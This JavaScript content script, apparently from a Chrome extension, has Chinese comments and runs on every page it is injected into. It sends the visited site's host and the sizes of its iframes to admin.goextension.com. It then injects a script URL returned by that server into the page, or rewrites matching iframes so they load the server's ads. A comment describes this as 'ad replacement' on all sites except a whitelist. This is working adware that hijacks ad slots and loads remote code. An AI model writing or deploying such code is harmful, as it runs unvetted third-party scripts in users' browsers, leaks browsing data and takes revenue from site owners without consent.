// 常量
var APP_ID = 311138640;
var DOMAIN = '//admin.goextension.com';
// 可否添加
var bAd = true;

// 网站数据
function getData (aAdId) {
    /**
     * 获取页面当中所有的iframe
     * @type {NodeList}
     */
    var oIframe = document.getElementsByTagName('iframe'),
        aIframe = [],   //所有的iframe
        aSize = [];     //iframe大小
    for(var i=0 ; i<oIframe.length ; i++){
        if(oIframe[i].offsetWidth || oIframe[i].offsetHeight){
            aSize.push(oIframe[i].offsetWidth+'*'+oIframe[i].offsetHeight);
            aIframe.push(oIframe[i]);
        }
    }
    //当前网站host
    var web = window.location.host;
    /**
     * @type {size : Array,count : Number,web : string,appid : stringrete : Array}
     * size : iframe尺寸大小
     * count : iframe数量
     * web : 当前网站url
     * appid : appid
     * rate :  超过展示次数的广告
     */
    var data = {
        size : aSize,
        count : aSize.length,
        web : web,
        appid : APP_ID,
        rate : aAdId
    };
    return data;
}

// 添加方法
function recommend(data) {
    $.ajax({
        url : DOMAIN + '/api/get-ad',
        type : 'post',
        data : data,
        success : function (json) {
            // 40003    没有接收到到参数
            // 40004    没有对应尺寸的广告
            // 40005    该网站在白名单内，不做广告替换
            if( json.code == 40003 || json.code == 40004 || json.code == 40005 )return;
            var data = json.data;
            // js广告
            if( data.type == 1 ){
                $('<script></script>').attr('src', data.list[0]).appendTo('body');
                var adId = data.list['id'];
                // 获取到广告id以后传给background,background存到localStorage中
                if( adId ){
                    chrome.extension.sendRequest({adId: adId});
                }
                // 配置广告
            }else if( data.type == 2 ){
                for(var i=0 ; i<data.list.length ; i++){
                    var bFlag = true;
                    var width = data.list[i].size.split('*')[0],
                        height = data.list[i].size.split('*')[1],
                        url = data.list[i].url;

                    for(var j=i ; j<aIframe.length ; j++){
                        var iIframeWidth = aIframe[j].offsetWidth,
                            iIframeHeight = aIframe[j].offsetHeight;
                        if( iIframeWidth == width && iIframeHeight == height && bFlag && !aIframe[j].getAttribute('bFlag') ){
                            aIframe[j].src = url;
                            aIframe[j].setAttribute('bFlag', true);
                            bFlag = false;
                        }
                    }
                }
            }
        }
    })
}

// 获取adId，添加
function addRecommend () {
    // 超过30次的广告
    chrome.extension.onConnect.addListener(function(port) {
        port.onMessage.addListener(function(aAdId) {
            // 确保广告代码只调用一次
            if( bAd ){
                recommend(getData(aAdId));
                bAd = false;
            }
        });
    });
}

// 没有添加过则添加
var $plug = $('#chrome_plug_flag_1_0_0');
if(!$plug.length) {
    $plug = $('<div></div>').attr('id', 'chrome_plug_flag_1_0_0').css('display', 'none').appendTo('body');
    addRecommend();
}
